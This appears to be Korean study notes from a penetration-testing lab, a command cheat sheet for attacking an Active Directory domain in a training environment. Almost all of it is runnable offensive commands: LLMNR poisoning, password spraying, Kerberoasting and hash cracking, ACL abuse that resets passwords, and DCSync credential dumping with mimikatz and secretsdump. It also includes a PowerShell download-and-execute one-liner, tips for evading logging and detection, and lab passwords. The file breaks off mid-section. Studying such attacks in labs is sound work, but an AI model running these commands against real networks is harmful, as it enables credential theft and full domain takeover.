# Active Directory Enumeration

## 1. 공개 도메인 정보
```nslookup -type=txt domain.com```

<br/><br/>
## 호스트 식별
```sudo tcpdump -i ens224```<br/>
```sudo responder -I ens224 -A ```

### FPing Active Check
```fping -asgq 172.16.5.0/23```

### Nmap 스캐닝(-A 공격적 스캔)
```sudo nmap -v -A -iL hosts.txt -oN /home/host-enum```

<br/><br/>
## 2. 사용자 식별

### Kerbrute - 내부 AD 사용자 이름 Enumeration
```
sudo git clone https://github.com/ropnop/kerbrute.git
make help
sudo make all
ls dist/
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt | tee valid_ad_users
```
<br/><br/>
## 3. LLMNR & NBT-NS Sniffing

### Responder - Linux
```sudo responder -I ens224```<br/>
로그 위치 : /usr/share/responder/logs<br/>
```hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt```

### Inveigh - Windows
```Import-Module .\Inveigh.ps1```<br/>
```Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y```

#### C# Inveigh (InveighZero)
```
.\Inveigh.exe
> ESC키
> GET NTLMV2USERNAMES   # 수집된 사용자명
> GET NTLMV2UNIQUE      # 수집된 Hash
```

<br/><br/>
## 4. Password Spraying

### 비밀번호 정책 열거 - 자격증명 있을 경우 (Linux)
```crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol```

### 비밀번호 정책 열거 - SMB NULL Sessions (Linux)
```rpcclient -U "" -N 172.16.5.5```<br/>
도메인 정보 : ```rpcclient $> querydominfo```</br>
비밀번호 정책 : ```rpcclient $> getdompwinfo```

### 비밀번호 정책 열거 - enum4linux (Linux)
```enum4linux -P 172.16.5.5```<br/>
```enum4linux-ng -P 172.16.5.5 -oA <outfile>```<br/>
```cat outfile.json```

### 비밀번호 정책 열거 - LDAP Anonymous Bind (Linux)
```ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength```

### 비밀번호 정책 열거 - SMB NULL Sessions (Windows)
```net use \\DC01\ipc$ "" /u:""```              # null session 연결 확인<br/>
```net use \\DC01\ipc$ "" /u:guest```           # Account 비활성화 확인<br/>
```net use \\DC01\ipc$ "password" /u:guest```   # Password 비일치 또는 계정 잠김 확인

### 비밀번호 정책 열거 (Windows)
내장 명령 : ```net accounts```
```
import-module .\PowerView.ps1
Get-DomainPolicy
```

### SMB NULL Sessions으로 사용자 목록 가져오기
```enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"```
```
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```
```crackmapexec smb 172.16.5.5 --users```

### LDAP Anonymous를 사용하여 사용자 수집
```ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "```<br/>
```./windapsearch.py --dc-ip 172.16.5.5 -u "" -U```<br/>
```crackmapexec ldap 172.16.5.5 -u "" -p "" --users```

### Kerbrute를 사용하여 사용자 열거
```kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt```

### 유효한 자격 증명을 사용하여 사용자 열거
```sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users```

<br/><br/>
## 5. Internal Password Spraying - from Linux

### Bash를 이용한 one-liner Attack (rpcclient 사용)
```for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done```

### Kerbrute 사용
```kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1```

### CrackMapExec 사용
```sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +```

### CrackMapExec를 사용하여 자격증명 검증
```sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123```

### CrackMapExec를 사용한 Local Admin Spraying
```sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +```

<br/><br/>
## 6. Internal Password Spraying - from Windows

### DomainPasswordSpray.ps1 사용
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

<br/><br/>
## 7. 보안 설정 Enumerating

### Windows Defender 상태 체크
```Get-MpComputerStatus```

### AppLocker 체크
```Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections```

### Enumerating Language Mode (PowerShell)
```$ExecutionContext.SessionState.LanguageMode```

### LAPS(Local Administrator Password Solution) 체크
```Find-LAPSDelegatedGroups```<br/>
```Find-AdmPwdExtendedRights```<br/>
```Get-LAPSComputers```

<br/><br/>
## 8. 자격증명 Enumerating - from Linux

### 도메인 사용자 열거
```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users```

### 도메인 그룹 열거
```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups```

### 로그인한 사용자
```sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users```

### Share Enumeration - Domain Controller
```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares```

#### Share Enumeration - Spider_plus
```sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'```<br/>
```head -n 10 /tmp/cme_spider_plus/172.16.5.5.json ```

### SMBMap사용하여 Access 체크
```smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5```

### SMBMap사용하여 모든 디렉토리 열거
```smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only```

### rpcclient를 사용한 SMB Null Session 체크
```rpcclient -U "" -N 172.16.5.5```

### Enumdomusers로 모든 사용자 열거
```rpcclient $> enumdomusers```

### rpcclient에서 RID로 User 열거
```rpcclient $> queryuser 0x457```

### Psexec.py로 호스트 연결 (로컬 관리자 권한 사용자 필요)
```psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125```

### wmiexec.py를 사용
```wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5```

### Windapsearch - Domain Admins
```python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da```

### Windapsearch - Privileged Users
```python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU```

### BloodHound.py 실행
```sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all```

<br/><br/>
## 9. 자격증명 Enumerating - from Windows

### ActiveDirectory 모듈 Load
```Import-Module ActiveDirectory```<br/>
```Get-Module```

### Get Domain Info
```Get-ADDomain```

### Get-ADUser
```Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName```

### Trust Relationships 체크
```Get-ADTrust -Filter *```

### Group Enumeration
```Get-ADGroup -Filter * | select name```

### 상세 Group Info
```Get-ADGroup -Identity "Backup Operators"```

### Group Membership
```Get-ADGroupMember -Identity "Backup Operators"```

### PowerView

| **Command**                         | **설명**                                            |
| ----------------------------------- | ------------------------------------------------- |
| `Export-PowerViewCSV`               | 결과를 CSV 파일에 추가                                    |
| `ConvertTo-SID`                     | 사용자 또는 그룹 이름을 SID 값으로 변환                          |
| `Get-DomainSPNTicket`               | 지정된 서비스 주체 이름(SPN) 계정에 대한 Kerberos 티켓을 요청합니다.     |
| **Domain/LDAP Functions:**          |                                                   |
| `Get-Domain`                        | 현재(또는 지정된) 도메인에 대한 AD 개체를 반환합니다.                  |
| `Get-DomainController`              | 지정된 도메인에 대한 도메인 컨트롤러 목록을 반환합니다.                   |
| `Get-DomainUser`                    | AD의 모든 사용자 또는 특정 사용자 개체를 반환합니다.                   |
| `Get-DomainComputer`                | AD의 모든 컴퓨터 또는 특정 컴퓨터 개체를 반환합니다.                   |
| `Get-DomainGroup`                   | AD의 모든 그룹 또는 특정 그룹 개체를 반환합니다.                     |
| `Get-DomainOU`                      | AD에서 모든 OU 개체 또는 특정 OU 개체 검색                      |
| `Find-InterestingDomainAcl`         | 수정 권한이 내장되지 않은 개체로 설정된 도메인에서 개체 ACL을 찾습니다.        |
| `Get-DomainGroupMember`             | 특정 도메인 그룹의 멤버를 반환합니다.                             |
| `Get-DomainFileServer`              | 파일 서버로 작동할 가능성이 있는 서버 목록을 반환합니다.                  |
| `Get-DomainDFSShare`                | 현재(또는 지정된) 도메인에 대한 모든 분산 파일 시스템 목록을 반환합니다.        |
| **GPO Functions:**                  |                                                   |
| `Get-DomainGPO`                     | AD의 모든 GPO 또는 특정 GPO 개체를 반환합니다.                   |
| `Get-DomainPolicy`                  | 현재 도메인에 대한 기본 도메인 정책 또는 도메인 컨트롤러 정책을 반환합니다.       |
| **Computer Enumeration Functions:** |                                                   |
| `Get-NetLocalGroup`                 | 로컬 또는 원격 시스템의 로컬 그룹을 열거합니다.                       |
| `Get-NetLocalGroupMember`           | 특정 로컬 그룹의 멤버를 열거합니다                               |
| `Get-NetShare`                      | 로컬(또는 원격) 머신에서 열려 있는 공유를 반환합니다.                   |
| `Get-NetSession`                    | 로컬(또는 원격) 머신에 대한 세션 정보를 반환합니다.                    |
| `Test-AdminAccess`                  | 현재 사용자에게 로컬(또는 원격) 시스템에 대한 관리 액세스 권한이 있는지 테스트합니다. |
| **Threaded 'Meta'-Functions:**      |                                                   |
| `Find-DomainUserLocation`           | 특정 사용자가 로그인한 컴퓨터를 찾습니다.                           |
| `Find-DomainShare`                  | 도메인 머신에서 접근 가능한 공유를 찾습니다.                         |
| `Find-InterestingDomainShareFile`   | 도메인의 읽기 가능한 공유에서 특정 기준과 일치하는 파일을 검색합니다.           |
| `Find-LocalAdminAccess`             | 현재 사용자가 로컬 관리자 액세스 권한을 가지고 있는 로컬 도메인에서 컴퓨터를 찾습니다. |
| **Domain Trust Functions:**         |                                                   |
| `Get-DomainTrust`                   | 현재 도메인 또는 지정된 도메인에 대한 도메인 신뢰를 반환합니다.              |
| `Get-ForestTrust`                   | 현재 포리스트 또는 지정된 포리스트에 대한 모든 포리스트 트러스트를 반환합니다.      |
| `Get-DomainForeignUser`             | 사용자 도메인 외부의 그룹에 있는 사용자를 열거합니다.                    |
| `Get-DomainForeignGroupMember`      | 그룹 도메인 외부의 사용자가 있는 그룹을 열거하고 각 외국 멤버를 반환합니다.       |
| `Get-DomainTrustMapping`            | 현재 도메인에 대한 모든 신뢰와 그 외에 발견된 모든 신뢰를 나열합니다.          |

### Domain User Information
```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

### 재귀적 Group Membership
```Get-DomainGroupMember -Identity "Domain Admins" -Recurse```

### Trust Enumeration
```Get-DomainTrustMapping```

### Local Admin Access 테스트
```Test-AdminAccess -ComputerName ACADEMY-EA-MS01```

### SPN Set으로 User 찾기
```Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName```

### SharpView를 사용하여 특정 사용자 정보 열거
```.\SharpView.exe Get-DomainUser -Identity <user>```

### Snaffler 실행 (자격증명, 민감 데이터 획득용)
```Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data```

### SharpHound 실행
```SharpHound.exe -c All --zipfilename <outfile>```

<br/><br/>
## 10. Living Off the Land

### 기본 Enumeration 명령

| **Command**                                             | **결과**                                         |
| ------------------------------------------------------- | ---------------------------------------------- |
| `hostname`                                              | PC의 이름을 인쇄합니다                                  |
| `[System.Environment]::OSVersion.Version`               | OS 버전 및 개정 수준을 인쇄합니다.                          |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | 호스트에 적용된 패치 및 핫픽스를 인쇄합니다.                      |
| `ipconfig /all`                                         | 네트워크 어댑터 상태 및 구성을 인쇄합니다.                       |
| `set`                                                   | 현재 세션에 대한 환경 변수 목록을 표시합니다(CMD 프롬프트에서 실행)       |
| `echo %USERDOMAIN%`                                     | 호스트가 속한 도메인 이름을 표시합니다(CMD 프롬프트에서 실행)           |
| `echo %logonserver%`                                    | 호스트가 체크인하는 도메인 컨트롤러의 이름을 인쇄합니다(CMD 프롬프트에서 실행). |

### PowerShell 활용

| **Cmd-Let**                                                                                                                | **설명**                                                                                                                                                             |
| -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Get-Module`                                                                                                               | 사용을 위해 로드된 사용 가능한 모듈을 나열합니다.                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | 호스트의 각 범위에 대한 [실행 정책](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) 설정을 인쇄합니다 . |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | 이렇게 하면 `-Scope` 매개변수를 사용하여 현재 프로세스의 정책이 변경됩니다. 이렇게 하면 프로세스를 비우거나 종료하면 정책이 원래대로 돌아갑니다. 피해자 호스트에 영구적인 변경을 하지 않기 때문에 이상적입니다.                                          |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | 키 경로, 사용자, 컴퓨터 정보 등의 환경 값을 반환합니다.                                                                                                                                  |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | 이 문자열을 사용하면 지정된 사용자의 PowerShell 기록을 가져올 수 있습니다. 명령 기록에 비밀번호가 포함되어 있거나 비밀번호가 포함된 구성 파일이나 스크립트를 가리킬 수 있으므로 매우 유용할 수 있습니다.                                            |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | 이것은 PowerShell을 사용하여 웹에서 파일을 다운로드하고 메모리에서 호출하는 빠르고 쉬운 방법입니다.                                                                                                       |

```Get-Module```<br/>
```Get-ExecutionPolicy -List```<br/>
```whoami```<br/>
```Get-ChildItem Env: | ft key,value```

### Powershell 다운그레이드 (로깅 우회용)
```powershell.exe -version 2```

### Firewall 체크
```netsh advfirewall show allprofiles```

### Windows Defender 체크
```sc query windefend```     # 실행 여부 확인<br/>
```Get-MpComputerStatus```   # 상태 및 구성 확인

### 로그인한 다른 사용자 확인
```qwinsta```

### 네트워크 정보

| **명령**                             | **설명**                                                        |
| ------------------------------------ | ------------------------------------------------------------- |
| `arp -a`                             | arp 테이블에 저장된 모든 알려진 호스트를 나열합니다.                               |
| `ipconfig /all`                      | 호스트에 대한 어댑터 설정을 출력합니다. 여기서 네트워크 세그먼트를 알아낼 수 있습니다.             |
| `route print`                        | 호스트와 공유되는 알려진 네트워크와 3계층 경로를 식별하는 라우팅 테이블(IPv4 및 IPv6)을 표시합니다. |
| `netsh advfirewall show allprofiles` | 호스트 방화벽의 상태를 표시합니다. 활성화되어 있고 트래픽을 필터링하고 있는지 확인할 수 있습니다.       |

### WMI 체크

| **명령**                                                                               | **설명**                                       |
| ------------------------------------------------------------------------------------ | -------------------------------------------- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | 적용된 핫픽스의 패치 레벨과 설명을 인쇄합니다.                   |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | 목록 내의 모든 속성을 포함하도록 기본 호스트 정보를 표시합니다.         |
| `wmic process list /format:list`                                                     | 호스트의 모든 프로세스 목록                              |
| `wmic ntdomain list /format:list`                                                    | 도메인 및 도메인 컨트롤러에 대한 정보를 표시합니다.                |
| `wmic useraccount list /format:list`                                                 | 장치에 로그인한 모든 로컬 계정 및 모든 도메인 계정에 대한 정보를 표시합니다. |
| `wmic group list /format:list`                                                       | 모든 지역 그룹에 대한 정보                              |
| `wmic sysaccount list /format:list`                                                  | 서비스 계정으로 사용되는 모든 시스템 계정에 대한 정보를 덤프합니다.       |

[WMI Cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)<br/>
```wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress```

### Net 명령

| **명령**                                          | **설명**                                                              |
| ----------------------------------------------- | ------------------------------------------------------------------- |
| `net accounts`                                  | 비밀번호 요구 사항에 대한 정보                                                   |
| `net accounts /domain`                          | 비밀번호 및 잠금 정책                                                        |
| `net group /domain`                             | 도메인 그룹에 대한 정보                                                       |
| `net group "Domain Admins" /domain`             | 도메인 관리자 권한이 있는 사용자 목록                                               |
| `net group "domain computers" /domain`          | 도메인에 연결된 PC 목록                                                      |
| `net group "Domain Controllers" /domain`        | 도메인 컨트롤러의 PC 계정 목록                                                  |
| `net group <domain_group_name> /domain`         | 그룹에 속한 사용자                                                          |
| `net groups /domain`                            | 도메인 그룹 목록                                                           |
| `net localgroup`                                | 사용 가능한 모든 그룹                                                        |
| `net localgroup administrators /domain`         | 도메인 내의 관리자 그룹에 속하는 사용자를 나열합니다(여기에는 기본적으로 `Domain Admins` 그룹이 포함됩니다) |
| `net localgroup Administrators`                 | 그룹(관리자)에 대한 정보                                                      |
| `net localgroup administrators [username] /add` | 관리자에 사용자 추가                                                         |
| `net share`                                     | 현재 공유 확인                                                            |
| `net user <ACCOUNT_NAME> /domain`               | 도메인 내 사용자에 대한 정보 가져오기                                               |
| `net user /domain`                              | 도메인의 모든 사용자를 나열합니다                                                  |
| `net user %username%`                           | 현재 사용자에 대한 정보                                                       |
| `net use x: \computer\share`                    | 공유를 로컬로 마운트합니다                                                      |
| `net view`                                      | 컴퓨터 목록을 받으세요                                                        |
| `net view /all /domain[:domainname]`            | 도메인에 대한 공유                                                          |
| `net view \computer /ALL`                       | 컴퓨터의 주식 목록                                                          |
| `net view /domain`                              | 도메인의 PC 목록                                                          |

```net group /domain```<br/>
```net user /domain wrouse```<br/>
> Trick : net 명령 대신 net1 입력으로 탐지 우회 가능

### Dsquery 명령 (Active Directory 개체 찾기)
``` dsquery user```<br/>
```dsquery computer```<br/>
```dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"```<br/>

### Dsquery 명령 (PASSWD_NOTREQD 플래그 사용자)
```dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl```

### Dsquery 명령 (모든 Domain Controllers 검색, 최대 5개 결과)
```dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName```

<br/><br/>
## 11. Kerberoasting - from Linux

### GetUserSPNs.py로 SPN Accounts 나열
```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend```

### 모든 TGS Tickets 요청
```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request```

### 단일 TGS ticket 요청
```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev```

### TGS Ticket을 출력 파일에 저장
```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs```

### Hashcat으로 오프라인 Ticket Cracking
```hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt```

### 도메인 컨트롤러에 대한 인증 테스트
```sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!```

<br/><br/>
## 12. Kerberoasting - from Windows

### setspn.exe로 SPN 열거
```setspn.exe -Q */*```

### 단일 사용자 타겟팅
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

### setspn.exe를 사용하여 All Tickets 검색
```setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }```

### Mimikatz를 사용하여 메모리에서 티켓 추출
```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

### Cracking을 위한 Base64 Blob 정리 (줄바꿈, 공백 제거)
```echo "<base64 blob>" |  tr -d \\n```

### base64 출력을 .kirbi 파일로 변환
```cat encoded_file | base64 -d > sqldev.kirbi```

### kirbi2john.py를 사용하여 Kerberos Ticket 추출
```python2.7 kirbi2john.py sqldev.kirbi```

### Hashcat을 사용하기 위해 파일 수정
```sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat```

### Hashcat으로 Cracking
```hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt```

### TGS Tickets 추출을 위한 PowerView 사용
```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

### 특정 사용자 타켓을 위한 PowerView 사용
```Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat```

### 모든 Ticket을 CSV 파일로 내보내기
```Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation```<br/>
```cat .\ilfreight_tgs.csv```

### Rubeus 사용하여 통계 수집 (/stats 플래그)
```Rubeus.exe kerberoast /stats```

### 오프라인 cracking을 위한 명령 (admincount 속성 1, /nowrap 플래그)
```Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap```

### 특정 사용자 Ticket 수집
```Rubeus.exe kerberoast /user:testspn /nowrap```

### 특정 사용자 Ticket 수집 (RC4 암호화만 원할 때, /tgtdeleg 플래그)
```Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap```

<br/><br/>
# Access Control List(ACL) & Access Control Entries(ACE) Abuse

## 1. PowerView를 사용하여 ACL 열거

### Find-InterestingDomainAcl 사용 (너무 많은 ACL 열거)
```Find-InterestingDomainAcl```

### 특정 사용자만 타겟 (예 : wley)
```
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
```

### Get-DomainObjectACL 사용 
```Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}```

### GUID 값으로 Reverse Search & Mapping 
```
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

### ObjectAceType 속성 자동 변환 (-ResolveGUIDs 플래그)
```Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}```

### Domain Users List 생성 (수동 : 오래걸림)
```
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

### damundsen 사용자를 사용하여 권한 열거
```
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

### Get-DomainGroup을 사용하여 Help Desk Level 1 Group 조사
```Get-DomainGroup -Identity "Help Desk Level 1" | select memberof```

### Information Technology Group 조사
```
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

### adunn 사용자의 흥미로운 접근 권한 찾기
```
$adunnsid = Convert-NameToSid adunn 
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

<br/><br/>
## 2. Abusing ACLs

### PSCredential Object 생성 (wley 자격증명 사용)
```
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

### SecureString Object 생성
```$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force```

### damundsen 사용자 Password 변경
```
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

### damundsen을 사용하여 SecureString Object 생성
```
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

### Help Desk Level 1 Group에 damundsen 추가
```
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

### damundsen이 Group에 추가됨을 확인
```Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName```

### Fake SPN(Service Principal Name) 생성
```Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose```

### Kerberoasting - Rubeus
```.\Rubeus.exe kerberoast /user:adunn /nowrap```

### 정리 작업 1 - adunn 계정으로 Fake SPN 제거
```Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose```

### 정리 작업 2 - Help Desk Level 1 Group에서 damundsen 제거
```Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose```

### 정리 작업 3 - Help Desk Level 1 Group에서 damundsen 제거 여부 확인
```Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose```

<br/><br/>
## 3. DCSync

### Get-DomainUser를 사용하여 adunn의 Group Membership 확인
```Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl```

### Get-ObjectAcl를 사용하여 adunn의 Replication 권한 확인
```
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### secretsdump.py를 사용하여 NTLM 해시 및 Kerberos 키 추출
```secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5```<br/>
- NTLM 해시 : ```-just-dc-ntlm 플래그```<br/>
- 특정 사용자 : ```-just-dc-user <USERNAME> 플래그```<br/>
- 비밀번호 마지막 변경시기 : ```-pwd-last-set 플래그```<br/>
- 비밀번호 크래킹 보충 데이터 : ```-history 플래그```<br/>
- 비활성화 사용자 확인 : ```-user-status 플래그```

### Get-ADUser를 사용하여 추가 열거 (Reversible 암호화(RC4) 계정)
```Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl```

### Get-DomainUser를 사용하여 Reversible 암호화(RC4) 계정 체크
```Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol```

### Mimikatz로 DCSync 공격 수행
```
runas /netonly /user:INLANEFREIGHT\adunn powershell
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

<br/><br/>
## 4. Privileged Access

### Remote Desktop Users Group 열거
```Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"```

### Remote Management Users Group 열거
```Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"```

### BloodHound로 원격 권한 사용자 확인 (화면 하단 Raw Query)
```MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2```

### Windows에서 WinRM Session 연결
```
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

### Linux에서 Evil-WinRM을 사용하여 연결
```evil-winrm -i 10.129.201.234 -u forend```

### BloodHound로 SQLAdmin 권한 사용자 확인 (화면 하단 Raw Query)
```MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2```<br/>
또는 ```Node Info 탭에서 SQL Admin Rights을 확인```

### PowerUpSQL을 사용하여 MSSQL Instances 열거
```
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

### mssqlclient.py 실행
```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

<br/><br/>
## 5. Kerberos "Double Hop" 문제

### evil-winrm 세션에서 해결 방법 #1: PSCredential Object
```
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
get-domainuser -spn -credential $Cred | select samaccountname
klist
```

### WinRM 세션에서 해결 방법 #2: Register PSSession Configuration
```
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
